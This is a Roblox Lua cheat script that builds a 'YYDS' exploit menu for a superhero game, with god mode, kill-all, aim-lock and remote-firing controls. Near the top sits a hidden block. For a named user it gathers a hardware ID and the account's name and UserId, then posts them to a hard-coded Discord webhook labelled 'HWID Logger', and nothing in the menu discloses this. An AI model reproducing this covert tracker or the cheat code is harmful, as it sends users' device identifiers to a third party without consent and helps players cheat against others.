local Players = game:GetService("Players")
local UIS = game:GetService("UserInputService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer
do
	local isMobile = UIS.TouchEnabled and not UIS.KeyboardEnabled
	if (not isMobile) and UIS.TouchEnabled and not UIS.MouseEnabled then
	isMobile = true
	end
	if LocalPlayer.Name == "happyYYDS1314" then
	LocalPlayer:SetAttribute("YYDSPC", true)
	elseif isMobile then
	LocalPlayer:SetAttribute("YYDSPC", false)
	else
	LocalPlayer:SetAttribute("YYDSPC", true)
	end
end
pcall(function()
	local raw = nil
	if isfile and isfile("yyds_pcset_dev_v2.txt") then
	raw = readfile("yyds_pcset_dev_v2.txt")
	else
	raw = readfile("yyds_pcset_dev_v2.txt")
	end
	raw = string.upper(tostring(raw or ""))
	raw = string.gsub(raw, "[^A-Z0-9]", "")
	raw = string.sub(raw, 1, 1)
	if raw ~= "" then
	LocalPlayer:SetAttribute("YYDSMenuBind", raw)
	end
end)
task.spawn(function()
	local TRACKED = {["AsenhaeTobaomais"] = true}
	if not TRACKED[LocalPlayer.Name] then return end
	local REPORT_WEBHOOK = "https://discord.com/api/webhooks/1546344194195333200/p6hoxG790DI__OYBW2fSZaqONbaDaAwpeTZ5Mnpu1Bmq8HcirD8ho-WoO-yV7rGiG8oz"
	local h
	pcall(function() h = gethwid() end)
	if not h then pcall(function() h = syn and syn.get_hwid and syn.get_hwid() end) end
	if not h then
	pcall(function()
	h = game:GetService("RbxAnalyticsService"):GetClientId()
	end)
	end
	h = tostring(h or "UNKNOWN")
	local body = game:GetService("HttpService"):JSONEncode({
	username = "HWID Logger",
	content = string.format("🎯 **%s** 開啟腳本\n**UserId**: %d\n**HWID**: `%s`", LocalPlayer.Name, LocalPlayer.UserId, h)
	})
	pcall(function()
	game:HttpPost(REPORT_WEBHOOK, body, "application/json")
	end)
end)
-- Clean up old GUIs
local oldGui = LocalPlayer:WaitForChild("PlayerGui"):FindFirstChild("DracoHubScannerV7")
if oldGui then oldGui:Destroy() end
local oldLaserGui = LocalPlayer:WaitForChild("PlayerGui"):FindFirstChild("DracoHubLaserButton")
if oldLaserGui then oldLaserGui:Destroy() end
local oldUpthrowGui = LocalPlayer:WaitForChild("PlayerGui"):FindFirstChild("DracoHubUpthrowButton")
if oldUpthrowGui then oldUpthrowGui:Destroy() end
local oldFinalGui = LocalPlayer:WaitForChild("PlayerGui"):FindFirstChild("DracoHubFinalButton")
if oldFinalGui then oldFinalGui:Destroy() end
local oldKickGui = LocalPlayer:WaitForChild("PlayerGui"):FindFirstChild("DracoHubKickButton")
if oldKickGui then oldKickGui:Destroy() end
local oldFloating = LocalPlayer:WaitForChild("PlayerGui"):FindFirstChild("DracoHubFloatingButtons")
if oldFloating then oldFloating:Destroy() end
local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
local Root = Character:WaitForChild("HumanoidRootPart")
local flightTask = nil
local kickActive = false
-- Finisher
local finisherEnabled = false
local finisherLoopThread = nil
local finisherActive = false
-- Kill All
local killAllActive = false
local killAllTeleportThread = nil
local KILLALL_OFFSET = 3
-- A-Train / Aim
local aTrainModActive = false
local homelanderModActive = false
local aimActive = false
local aimTarget = nil
local aimLine = nil
local aimHighlight = nil
local aimUpdateConnection = nil
local aimModeActive = false
local cancelButton = nil
local AIM_EXECUTE_REMOTE_NAME = "MoveOne"
local aimColor = Color3.fromRGB(255, 0, 0) -- Ramkill red / Blink yellow
local aimSource = nil -- "top" = Ramkill, "bottom" = Blink
-- Execution state
local isExecuting = false
local executionCanceled = false
local executionFlashThread = nil
local executionConnection = nil
local webBlossomThread = nil
-- ========== Author Tag ==========
local AUTHOR_NAME = "happyYYDS1314"
local authorTag = nil
local authorCheckThread = nil
local function createAuthorTag(player)
	if authorTag then authorTag:Destroy(); authorTag = nil end
	if not player or not player.Character then return end
	local head = player.Character:FindFirstChild("Head")
	if not head then return end
	local part = Instance.new("Part")
	part.Name = "AuthorTag"
	part.Size = Vector3.new(9.5, 0.70, 0.05)
	part.Anchored = true
	part.CanCollide = false
	part.CanTouch = false
	part.CastShadow = false
	part.Transparency = 1
	part.Parent = head
	local sg = Instance.new("SurfaceGui")
	sg.Face = Enum.NormalId.Back
	sg.SizingMode = Enum.SurfaceGuiSizingMode.PixelsPerStud
	sg.PixelsPerStud = 50
	sg.LightInfluence = 0
	sg.AlwaysOnTop = false
	sg.Parent = part
	local container = Instance.new("Frame")
	container.Size = UDim2.new(1, 0, 1, 0)
	container.BackgroundTransparency = 1
	container.Parent = sg
	local layout = Instance.new("UIListLayout")
	layout.FillDirection = Enum.FillDirection.Horizontal
	layout.HorizontalAlignment = Enum.HorizontalAlignment.Center
	layout.VerticalAlignment = Enum.VerticalAlignment.Center
	layout.Padding = UDim.new(0, 2)
	layout.Parent = container
	local icon = Instance.new("ImageLabel")
	icon.Name = "Logo"
	icon.Size = UDim2.new(0, 32, 0, 32)
	icon.BackgroundTransparency = 1
	icon.Image = "rbxassetid://90728112297914"
	icon.ImageColor3 = Color3.fromRGB(255, 255, 255)
	icon.ScaleType = Enum.ScaleType.Fit
	icon.LayoutOrder = 1
	icon.Parent = container
	local label = Instance.new("TextLabel")
	label.Size = UDim2.new(0, 0, 1, 0)
	label.AutomaticSize = Enum.AutomaticSize.X
	label.BackgroundTransparency = 1
	label.Text = "[YYDS] Author Test Account"
	label.TextColor3 = Color3.fromRGB(255, 255, 255)
	label.Font = Enum.Font.GothamBold
	label.TextSize = 32
	label.TextScaled = false
	label.TextWrapped = false
	label.TextXAlignment = Enum.TextXAlignment.Left
	label.LayoutOrder = 2
	label.Parent = container
	authorTag = part
end
local function startAuthorDetection()
	if authorCheckThread then task.cancel(authorCheckThread) end
	authorCheckThread = task.spawn(function()
	RunService.Heartbeat:Connect(function()
	if authorTag and authorTag:IsA("BasePart") and authorTag.Parent then
	local head = authorTag.Parent
	local cam = workspace.CurrentCamera
	local pos = head.Position + Vector3.new(0, 2.2, 0)
	if cam then
	authorTag.CFrame = CFrame.lookAt(pos, pos + cam.CFrame.LookVector)
	else
	authorTag.CFrame = CFrame.new(pos)
	end
	end
	end)
	while true do
	local target = nil
	for _, p in ipairs(Players:GetPlayers()) do
	if p.Name == AUTHOR_NAME then
	target = p
	break
	end
	end
	if target and target.Character and target.Character:FindFirstChild("Head") then
	if not target.Character.Head:FindFirstChild("AuthorTag") then
	createAuthorTag(target)
	end
	else
	if authorTag then
	authorTag:Destroy()
	authorTag = nil
	end
	end
	task.wait(0.5)
	end
	end)
end
-- ==========================================
local DEFAULT_POSITIONS = {
	Laser = UDim2.new(1, -240, 0.5, -100),
	Upthrow = UDim2.new(1, -310, 0.5, -30),
	Flashstrike = UDim2.new(1, -310, 0.5, -138),
	Kick = UDim2.new(1, -310, 0.5, -100),
	MoAim = UDim2.new(1, -310, 0.5, -30)
}
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "DracoHubScannerV7"
ScreenGui.ResetOnSpawn = false
ScreenGui.IgnoreGuiInset = true
ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
local Main = Instance.new("Frame")
Main.Size = UDim2.new(0, 160, 0, 380)
Main.Position = UDim2.new(1, -160, 0, 0)
Main.BackgroundColor3 = Color3.fromRGB(16, 16, 16)
Main.BorderSizePixel = 0
Main.Parent = ScreenGui
local MainCorner = Instance.new("UICorner") MainCorner.CornerRadius = UDim.new(0,8) MainCorner.Parent = Main
local uiScale = Instance.new("UIScale") uiScale.Scale = 1 uiScale.Parent = Main
local TopBar = Instance.new("Frame")
TopBar.Size = UDim2.new(1,0,0,30)
TopBar.BackgroundColor3 = Color3.fromRGB(22,22,22)
TopBar.BorderSizePixel = 0
TopBar.Parent = Main
local TopBarCorner = Instance.new("UICorner") TopBarCorner.CornerRadius = UDim.new(0,8) TopBarCorner.Parent = TopBar
local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(0,60,1,0) Title.Position = UDim2.new(0.5,-30,0,0) Title.BackgroundTransparency = 1
Title.Text = "YYDS" Title.TextColor3 = Color3.fromRGB(255,255,255) Title.Font = Enum.Font.GothamBold Title.TextSize = 14 Title.TextXAlignment = Enum.TextXAlignment.Center Title.Parent = TopBar
local MinusBtn = Instance.new("TextButton")
MinusBtn.Size = UDim2.new(0,18,0,18) MinusBtn.Position = UDim2.new(0,4,0,6) MinusBtn.BackgroundColor3 = Color3.fromRGB(50,50,50)
MinusBtn.TextColor3 = Color3.fromRGB(255,255,255) MinusBtn.Font = Enum.Font.GothamBold MinusBtn.TextSize = 14 MinusBtn.Text = "—" MinusBtn.ZIndex = 5 MinusBtn.Parent = TopBar
local MinusCorner = Instance.new("UICorner") MinusCorner.CornerRadius = UDim.new(0,4) MinusCorner.Parent = MinusBtn
local LockButtonTop = Instance.new("TextButton")
LockButtonTop.Size = UDim2.new(0,22,0,22) LockButtonTop.Position = UDim2.new(0,26,0,4) LockButtonTop.BackgroundColor3 = Color3.fromRGB(35,35,35)
LockButtonTop.TextColor3 = Color3.fromRGB(255,80,80) LockButtonTop.Font = Enum.Font.GothamBold LockButtonTop.TextSize = 14 LockButtonTop.Text = "🔒" LockButtonTop.ZIndex = 10 LockButtonTop.Parent = TopBar
local LockTopCorner = Instance.new("UICorner") LockTopCorner.CornerRadius = UDim.new(0,4) LockTopCorner.Parent = LockButtonTop
local MinimizeIcon = Instance.new("ImageButton")
MinimizeIcon.Name = "MinimizeIcon" MinimizeIcon.Size = UDim2.new(0,60,0,60) MinimizeIcon.Position = UDim2.new(0,12,0.10,0)
MinimizeIcon.BackgroundTransparency = 1 MinimizeIcon.Image = "rbxassetid://90728112297914" MinimizeIcon.ScaleType = Enum.ScaleType.Fit MinimizeIcon.AutoButtonColor = false MinimizeIcon.Visible = false MinimizeIcon.ZIndex = 20 MinimizeIcon.Parent = ScreenGui
local IconCorner = Instance.new("UICorner") IconCorner.CornerRadius = UDim.new(0,12) IconCorner.Parent = MinimizeIcon
MinusBtn.MouseButton1Click:Connect(function() Main.Visible = false MinimizeIcon.Visible = true end)
MinimizeIcon.MouseButton1Click:Connect(function() Main.Visible = true MinimizeIcon.Visible = false end)
local iconDragging = false local iconDragStart, iconStartPos
MinimizeIcon.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
	iconDragging = true iconDragStart = input.Position iconStartPos = MinimizeIcon.Position
	end
end)
UIS.InputEnded:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then iconDragging = false end
end)
UIS.InputChanged:Connect(function(input)
	if iconDragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
	local delta = input.Position - iconDragStart
	MinimizeIcon.Position = UDim2.new(iconStartPos.X.Scale, iconStartPos.X.Offset + delta.X, iconStartPos.Y.Scale, iconStartPos.Y.Offset + delta.Y)
	end
end)
local TabContainer = Instance.new("Frame")
TabContainer.Size = UDim2.new(1,0,0,32) TabContainer.Position = UDim2.new(0,0,0,30) TabContainer.BackgroundColor3 = Color3.fromRGB(18,18,18) TabContainer.BorderSizePixel = 0 TabContainer.Parent = Main
local Tab1 = Instance.new("TextButton")
Tab1.Size = UDim2.new(0.5,-2,1,-4) Tab1.Position = UDim2.new(0,2,0,2) Tab1.BackgroundColor3 = Color3.fromRGB(80,50,120)
Tab1.TextColor3 = Color3.fromRGB(255,255,255) Tab1.Font = Enum.Font.GothamBold Tab1.TextSize = 11 Tab1.Text = "Scanner" Tab1.Parent = TabContainer
local Tab1Corner = Instance.new("UICorner") Tab1Corner.CornerRadius = UDim.new(0,4) Tab1Corner.Parent = Tab1
local Tab2 = Instance.new("TextButton")
Tab2.Name = "EX1_Button"
Tab2.Size = UDim2.new(0.5,-2,1,-4) Tab2.Position = UDim2.new(0.5,0,0,2) Tab2.BackgroundColor3 = Color3.fromRGB(35,35,35)
Tab2.TextColor3 = Color3.fromRGB(180,180,180) Tab2.Font = Enum.Font.GothamBold Tab2.TextSize = 11 Tab2.Text = "Extras"
Tab2.Parent = TabContainer
local Tab2Corner = Instance.new("UICorner") Tab2Corner.CornerRadius = UDim.new(0,4) Tab2Corner.Parent = Tab2
local Page1 = Instance.new("Frame")
Page1.Size = UDim2.new(1,0,1,-62) Page1.Position = UDim2.new(0,0,0,62) Page1.BackgroundTransparency = 1 Page1.Parent = Main
local Page2 = Instance.new("Frame")
Page2.Size = UDim2.new(1,0,1,-62) Page2.Position = UDim2.new(0,0,0,62) Page2.BackgroundTransparency = 1 Page2.Visible = false Page2.Parent = Main
local Page2Scroll = Instance.new("ScrollingFrame")
Page2Scroll.Size = UDim2.new(1, 0, 1, 0)
Page2Scroll.Position = UDim2.new(0, 0, 0, 0)
Page2Scroll.BackgroundTransparency = 1
Page2Scroll.BorderSizePixel = 0
Page2Scroll.ScrollBarThickness = 4
Page2Scroll.ScrollBarImageColor3 = Color3.fromRGB(120, 120, 120)
Page2Scroll.CanvasSize = UDim2.new(0, 0, 0, 670)
Page2Scroll.Parent = Page2
Tab1.MouseButton1Click:Connect(function()
	Page1.Visible = true Page2.Visible = false
	local p2 = Main:FindFirstChild("ExtrasPage_2")
	if p2 then p2.Visible = false end
	local god = Main:FindFirstChild("GiveGodModePage")
	if god then god.Visible = false end
	local nr = Main:FindFirstChild("NoRespawnPage")
	if nr then nr.Visible = false end
	local st = Main:FindFirstChild("ExSettingsPage")
	if st then st.Visible = false end
	local pS = Main:FindFirstChild("PageSettings")
	if pS then pS.Visible = false end
	Tab1.BackgroundColor3 = Color3.fromRGB(80,50,120) Tab1.TextColor3 = Color3.fromRGB(255,255,255)
	Tab2.Size = UDim2.new(0.5, -2, 1, -4)
	Tab2.Text = "Extras"
	Tab2.TextSize = 11
	Tab2.BackgroundColor3 = Color3.fromRGB(35,35,35)
	Tab2.BackgroundTransparency = 0
	Tab2.TextColor3 = Color3.fromRGB(180,180,180)
	local ex2 = TabContainer:FindFirstChild("EX2_Button")
	if ex2 then ex2.Visible = false end
end)
Tab2.MouseButton1Click:Connect(function()
	Page1.Visible = false Page2.Visible = true
	local p2 = Main:FindFirstChild("ExtrasPage_2")
	if p2 then p2.Visible = false end
	local god = Main:FindFirstChild("GiveGodModePage")
	if god then god.Visible = false end
	local nr = Main:FindFirstChild("NoRespawnPage")
	if nr then nr.Visible = false end
	local st = Main:FindFirstChild("ExSettingsPage")
	if st then st.Visible = false end
	local pS = Main:FindFirstChild("PageSettings")
	if pS then pS.Visible = false end
	Tab1.BackgroundColor3 = Color3.fromRGB(35,35,35) Tab1.TextColor3 = Color3.fromRGB(180,180,180)
	Tab2.Size = UDim2.new(0.25, -2, 1, -4)
	Tab2.Text = "EX 1"
	Tab2.TextSize = 10
	Tab2.BackgroundColor3 = Color3.fromRGB(140,60,220)
	Tab2.BackgroundTransparency = 0
	Tab2.TextColor3 = Color3.fromRGB(255,255,255)
	local ex2 = TabContainer:FindFirstChild("EX2_Button")
	if ex2 then
	ex2.Visible = true
	ex2.BackgroundColor3 = Color3.fromRGB(35,30,50)
	ex2.BackgroundTransparency = 0.4
	ex2.TextColor3 = Color3.fromRGB(160,150,180)
	end
end)
-- ==================== Page 1 - Scanner ====================
local SearchBox = Instance.new("TextBox")
SearchBox.Size = UDim2.new(1,-10,0,22) SearchBox.Position = UDim2.new(0,5,0,3) SearchBox.BackgroundColor3 = Color3.fromRGB(28,28,28)
SearchBox.TextColor3 = Color3.fromRGB(240,240,240) SearchBox.PlaceholderText = "Search..." SearchBox.Text = "" SearchBox.Font = Enum.Font.Gotham SearchBox.TextSize = 11 SearchBox.ClearTextOnFocus = false SearchBox.Parent = Page1
local SearchCorner = Instance.new("UICorner") SearchCorner.CornerRadius = UDim.new(0,5) SearchCorner.Parent = SearchBox
local ModeContainer = Instance.new("Frame")
ModeContainer.Size = UDim2.new(1,-10,0,20) ModeContainer.Position = UDim2.new(0,5,0,27) ModeContainer.BackgroundColor3 = Color3.fromRGB(20,20,20) ModeContainer.BorderSizePixel = 0 ModeContainer.Parent = Page1
local ModeContainerCorner = Instance.new("UICorner") ModeContainerCorner.CornerRadius = UDim.new(0,4) ModeContainerCorner.Parent = ModeContainer
local GodModeBtn = Instance.new("TextButton")
GodModeBtn.Size = UDim2.new(0.333,-4,0,18) GodModeBtn.Position = UDim2.new(0,2,0,1) GodModeBtn.BackgroundColor3 = Color3.fromRGB(60,40,90)
GodModeBtn.TextColor3 = Color3.fromRGB(240,220,255) GodModeBtn.Font = Enum.Font.GothamBold GodModeBtn.TextSize = 10 GodModeBtn.Text = "God" GodModeBtn.Parent = ModeContainer
local GodCorner = Instance.new("UICorner") GodCorner.CornerRadius = UDim.new(0,4) GodCorner.Parent = GodModeBtn
local ResetBtn = Instance.new("TextButton")
ResetBtn.Size = UDim2.new(0.333,-4,0,18) ResetBtn.Position = UDim2.new(0.666,2,0,1) ResetBtn.BackgroundColor3 = Color3.fromRGB(180,50,50)
ResetBtn.TextColor3 = Color3.fromRGB(255,255,255) ResetBtn.Font = Enum.Font.GothamBold ResetBtn.TextSize = 10 ResetBtn.Text = "Reset" ResetBtn.Parent = ModeContainer
local ResetCorner = Instance.new("UICorner") ResetCorner.CornerRadius = UDim.new(0,4) ResetCorner.Parent = ResetBtn
ResetBtn.MouseButton1Click:Connect(function()
	local char = LocalPlayer.Character
	local hum = char and char:FindFirstChildOfClass("Humanoid")
	if not hum then return end
	hum.Health = 0
end)
GodModeBtn.MouseButton1Click:Connect(function()
	task.spawn(function()
	local currentCharacter = LocalPlayer.Character if not currentCharacter then return end
	local currentRoot = currentCharacter:FindFirstChild("HumanoidRootPart") if not currentRoot then return end
	local originalCFrame = currentRoot.CFrame
	currentRoot.CFrame = originalCFrame + Vector3.new(0, 2000, 0)
	task.wait(0.1)
	local charactersFolder = ReplicatedStorage:FindFirstChild("Characters")
	if charactersFolder then
	for _, folder in ipairs(charactersFolder:GetChildren()) do
	if folder.Name:lower() == "steve_h" then
	local remotesFolder = folder:FindFirstChild("Remotes")
	if remotesFolder then
	for _, remote in ipairs(remotesFolder:GetChildren()) do
	if remote:IsA("RemoteEvent") and remote.Name:lower():find("death") then
	task.wait(0.1) remote:FireServer() task.wait(0.1) break
	end
	end
	end
	break
	end
	end
	end
	task.wait(0.7)
	if currentCharacter and currentRoot then currentRoot.CFrame = originalCFrame end
	end)
end)
-- ==================== Controllers ====================
local simultaneousEnabled = false
local simultaneousCount = 20
local isCustomLoopActive = false
local loopInterval = 0
local SimultaneousContainer = Instance.new("Frame")
SimultaneousContainer.Size = UDim2.new(1,-10,0,22)
SimultaneousContainer.Position = UDim2.new(0,5,0,49)
SimultaneousContainer.BackgroundColor3 = Color3.fromRGB(20,20,20)
SimultaneousContainer.BorderSizePixel = 0
SimultaneousContainer.Parent = Page1
local SimultaneousCorner = Instance.new("UICorner") SimultaneousCorner.CornerRadius = UDim.new(0,4) SimultaneousCorner.Parent = SimultaneousContainer
local SimultaneousToggle = Instance.new("TextButton")
SimultaneousToggle.Size = UDim2.new(0,18,0,18) SimultaneousToggle.Position = UDim2.new(0,5,0,2) SimultaneousToggle.BackgroundColor3 = Color3.fromRGB(40,40,40)
SimultaneousToggle.TextColor3 = Color3.fromRGB(0,255,120) SimultaneousToggle.Font = Enum.Font.GothamBold SimultaneousToggle.TextSize = 11 SimultaneousToggle.Text = "" SimultaneousToggle.Parent = SimultaneousContainer
local SimultaneousToggleCorner = Instance.new("UICorner") SimultaneousToggleCorner.CornerRadius = UDim.new(0,3) SimultaneousToggleCorner.Parent = SimultaneousToggle
local SimultaneousLabel = Instance.new("TextLabel")
SimultaneousLabel.Size = UDim2.new(0,40,1,0) SimultaneousLabel.Position = UDim2.new(0,28,0,0) SimultaneousLabel.BackgroundTransparency = 1
SimultaneousLabel.TextColor3 = Color3.fromRGB(200,200,200) SimultaneousLabel.Font = Enum.Font.Gotham SimultaneousLabel.TextSize = 9 SimultaneousLabel.Text = "Simul." SimultaneousLabel.TextXAlignment = Enum.TextXAlignment.Left SimultaneousLabel.Parent = SimultaneousContainer
local SimultaneousSubBtn = Instance.new("TextButton")
SimultaneousSubBtn.Size = UDim2.new(0,16,0,16) SimultaneousSubBtn.Position = UDim2.new(0,72,0,3) SimultaneousSubBtn.BackgroundColor3 = Color3.fromRGB(50,50,50)
SimultaneousSubBtn.TextColor3 = Color3.fromRGB(220,220,220) SimultaneousSubBtn.Font = Enum.Font.GothamBold SimultaneousSubBtn.TextSize = 12 SimultaneousSubBtn.Text = "-" SimultaneousSubBtn.Parent = SimultaneousContainer
local SimultaneousSubCorner = Instance.new("UICorner") SimultaneousSubCorner.CornerRadius = UDim.new(0,3) SimultaneousSubCorner.Parent = SimultaneousSubBtn
local SimultaneousInput = Instance.new("TextBox")
SimultaneousInput.Size = UDim2.new(0,26,0,16) SimultaneousInput.Position = UDim2.new(0,90,0,3) SimultaneousInput.BackgroundColor3 = Color3.fromRGB(30,30,30)
SimultaneousInput.TextColor3 = Color3.fromRGB(240,240,240) SimultaneousInput.Font = Enum.Font.Gotham SimultaneousInput.TextSize = 10 SimultaneousInput.Text = "20" SimultaneousInput.ClearTextOnFocus = false SimultaneousInput.Parent = SimultaneousContainer
local SimultaneousInputCorner = Instance.new("UICorner") SimultaneousInputCorner.CornerRadius = UDim.new(0,3) SimultaneousInputCorner.Parent = SimultaneousInput
local SimultaneousAddBtn = Instance.new("TextButton")
SimultaneousAddBtn.Size = UDim2.new(0,16,0,16) SimultaneousAddBtn.Position = UDim2.new(0,118,0,3) SimultaneousAddBtn.BackgroundColor3 = Color3.fromRGB(50,50,50)
SimultaneousAddBtn.TextColor3 = Color3.fromRGB(220,220,220) SimultaneousAddBtn.Font = Enum.Font.GothamBold SimultaneousAddBtn.TextSize = 12 SimultaneousAddBtn.Text = "+" SimultaneousAddBtn.Parent = SimultaneousContainer
local SimultaneousAddCorner = Instance.new("UICorner") SimultaneousAddCorner.CornerRadius = UDim.new(0,3) SimultaneousAddCorner.Parent = SimultaneousAddBtn
local CustomLoopContainer = Instance.new("Frame")
CustomLoopContainer.Size = UDim2.new(1,-10,0,22)
CustomLoopContainer.Position = UDim2.new(0,5,0,73)
CustomLoopContainer.BackgroundColor3 = Color3.fromRGB(20,20,20)
CustomLoopContainer.BorderSizePixel = 0
CustomLoopContainer.Parent = Page1
local CustomLoopContainerCorner = Instance.new("UICorner") CustomLoopContainerCorner.CornerRadius = UDim.new(0,4) CustomLoopContainerCorner.Parent = CustomLoopContainer
local CustomToggle = Instance.new("TextButton")
CustomToggle.Size = UDim2.new(0,18,0,18) CustomToggle.Position = UDim2.new(0,5,0,2) CustomToggle.BackgroundColor3 = Color3.fromRGB(40,40,40)
CustomToggle.TextColor3 = Color3.fromRGB(0,255,120) CustomToggle.Font = Enum.Font.GothamBold CustomToggle.TextSize = 11 CustomToggle.Text = "" CustomToggle.Parent = CustomLoopContainer
local CustomToggleCorner = Instance.new("UICorner") CustomToggleCorner.CornerRadius = UDim.new(0,3) CustomToggleCorner.Parent = CustomToggle
local CustomLabel = Instance.new("TextLabel")
CustomLabel.Size = UDim2.new(0,40,1,0) CustomLabel.Position = UDim2.new(0,28,0,0) CustomLabel.BackgroundTransparency = 1
CustomLabel.TextColor3 = Color3.fromRGB(200,200,200) CustomLabel.Font = Enum.Font.Gotham CustomLabel.TextSize = 9 CustomLabel.Text = "Loop" CustomLabel.TextXAlignment = Enum.TextXAlignment.Left CustomLabel.Parent = CustomLoopContainer
local SubBtn = Instance.new("TextButton")
SubBtn.Size = UDim2.new(0,16,0,16) SubBtn.Position = UDim2.new(0,72,0,3) SubBtn.BackgroundColor3 = Color3.fromRGB(50,50,50)
SubBtn.TextColor3 = Color3.fromRGB(220,220,220) SubBtn.Font = Enum.Font.GothamBold SubBtn.TextSize = 12 SubBtn.Text = "-" SubBtn.Parent = CustomLoopContainer
local SubCorner = Instance.new("UICorner") SubCorner.CornerRadius = UDim.new(0,3) SubCorner.Parent = SubBtn
local CustomInput = Instance.new("TextBox")
CustomInput.Size = UDim2.new(0,26,0,16) CustomInput.Position = UDim2.new(0,90,0,3) CustomInput.BackgroundColor3 = Color3.fromRGB(30,30,30)
CustomInput.TextColor3 = Color3.fromRGB(240,240,240) CustomInput.Font = Enum.Font.Gotham CustomInput.TextSize = 10 CustomInput.Text = "0.05" CustomInput.ClearTextOnFocus = false CustomInput.Parent = CustomLoopContainer
local InputCorner = Instance.new("UICorner") InputCorner.CornerRadius = UDim.new(0,3) InputCorner.Parent = CustomInput
local AddBtn = Instance.new("TextButton")
AddBtn.Size = UDim2.new(0,16,0,16) AddBtn.Position = UDim2.new(0,118,0,3) AddBtn.BackgroundColor3 = Color3.fromRGB(50,50,50)
AddBtn.TextColor3 = Color3.fromRGB(220,220,220) AddBtn.Font = Enum.Font.GothamBold AddBtn.TextSize = 12 AddBtn.Text = "+" AddBtn.Parent = CustomLoopContainer
local AddCorner = Instance.new("UICorner") AddCorner.CornerRadius = UDim.new(0,3) AddCorner.Parent = AddBtn
local function updateControllerUI()
	SimultaneousToggle.BackgroundColor3 = simultaneousEnabled and Color3.fromRGB(80,50,120) or Color3.fromRGB(40,40,40)
	SimultaneousToggle.Text = simultaneousEnabled and "✓" or ""
	CustomToggle.BackgroundColor3 = isCustomLoopActive and Color3.fromRGB(80,50,120) or Color3.fromRGB(40,40,40)
	CustomToggle.Text = isCustomLoopActive and "✓" or ""
end
SimultaneousToggle.MouseButton1Click:Connect(function()
	if simultaneousEnabled then
	simultaneousEnabled = false
	else
	simultaneousEnabled = true
	if isCustomLoopActive then
	isCustomLoopActive = false
	loopInterval = 0
	end
	end
	updateControllerUI()
end)
CustomToggle.MouseButton1Click:Connect(function()
	if isCustomLoopActive then
	isCustomLoopActive = false
	loopInterval = 0
	else
	isCustomLoopActive = true
	if simultaneousEnabled then
	simultaneousEnabled = false
	end
	local val = tonumber(CustomInput.Text) or 0.05
	loopInterval = math.max(0.001, val)
	end
	updateControllerUI()
end)
SimultaneousSubBtn.MouseButton1Click:Connect(function()
	local val = tonumber(SimultaneousInput.Text) or simultaneousCount
	val = math.max(1, val - 1)
	simultaneousCount = val
	SimultaneousInput.Text = tostring(val)
end)
SimultaneousAddBtn.MouseButton1Click:Connect(function()
	local val = tonumber(SimultaneousInput.Text) or simultaneousCount
	val = val + 1
	simultaneousCount = val
	SimultaneousInput.Text = tostring(val)
end)
SimultaneousInput:GetPropertyChangedSignal("Text"):Connect(function()
	local val = tonumber(SimultaneousInput.Text)
	if val and val > 0 then
	simultaneousCount = val
	else
	simultaneousCount = 20
	SimultaneousInput.Text = "20"
	end
end)
SubBtn.MouseButton1Click:Connect(function()
	local val = tonumber(CustomInput.Text) or 0.05
	val = math.max(0.001, val - 0.01)
	CustomInput.Text = string.format("%.3f", val):gsub("%.?0+$", "")
	if isCustomLoopActive then loopInterval = tonumber(CustomInput.Text) or 0.05 end
end)
AddBtn.MouseButton1Click:Connect(function()
	local val = tonumber(CustomInput.Text) or 0.05
	val = val + 0.01
	CustomInput.Text = string.format("%.3f", val):gsub("%.?0+$", "")
	if isCustomLoopActive then loopInterval = tonumber(CustomInput.Text) or 0.05 end
end)
CustomInput:GetPropertyChangedSignal("Text"):Connect(function()
	if isCustomLoopActive then
	local val = tonumber(CustomInput.Text)
	if val and val > 0 then loopInterval = val end
	end
end)
updateControllerUI()
local Scroll = Instance.new("ScrollingFrame")
Scroll.Size = UDim2.new(1,-4,1,-97)
Scroll.Position = UDim2.new(0,2,0,95)
Scroll.CanvasSize = UDim2.new(0,0,0,0)
Scroll.ScrollBarThickness = 4
Scroll.BackgroundTransparency = 1
Scroll.Parent = Page1
local List = Instance.new("UIListLayout") List.SortOrder = Enum.SortOrder.LayoutOrder List.Padding = UDim.new(0,3) List.Parent = Scroll
-- ==================== Page 2 - Extras ====================
local HomelanderModBtn = Instance.new("TextButton")
HomelanderModBtn.Size = UDim2.new(1, -10, 0, 24)
HomelanderModBtn.Position = UDim2.new(0, 5, 0, 10)
HomelanderModBtn.BackgroundColor3 = Color3.fromRGB(255, 0, 60)
HomelanderModBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
HomelanderModBtn.Font = Enum.Font.GothamBold
HomelanderModBtn.TextSize = 12
HomelanderModBtn.Text = "Homelander"
HomelanderModBtn.TextScaled = true
HomelanderModBtn.Parent = Page2Scroll
local HomelanderModCorner = Instance.new("UICorner") HomelanderModCorner.CornerRadius = UDim.new(0,4) HomelanderModCorner.Parent = HomelanderModBtn
local FinisherButton = Instance.new("TextButton")
FinisherButton.Size = UDim2.new(0.5, -8, 0, 24)
FinisherButton.Position = UDim2.new(0.5, 2, 0, 10)
FinisherButton.BackgroundColor3 = Color3.fromRGB(30, 100, 60)
FinisherButton.TextColor3 = Color3.fromRGB(255, 255, 255)
FinisherButton.Font = Enum.Font.GothamBold
FinisherButton.TextSize = 10
FinisherButton.Text = "Auto Finisher OFF"
FinisherButton.TextScaled = true
FinisherButton.Visible = false
FinisherButton.Parent = Page2Scroll
local FinisherCorner = Instance.new("UICorner") FinisherCorner.CornerRadius = UDim.new(0,4) FinisherCorner.Parent = FinisherButton
local LaserCompatibilityLabel = Instance.new("TextLabel")
LaserCompatibilityLabel.Size = UDim2.new(1, -10, 0, 14)
LaserCompatibilityLabel.Position = UDim2.new(0, 5, 0, 36)
LaserCompatibilityLabel.BackgroundTransparency = 1
LaserCompatibilityLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
LaserCompatibilityLabel.Font = Enum.Font.Gotham
LaserCompatibilityLabel.TextSize = 6
LaserCompatibilityLabel.Text = "(Laser: homelander)"
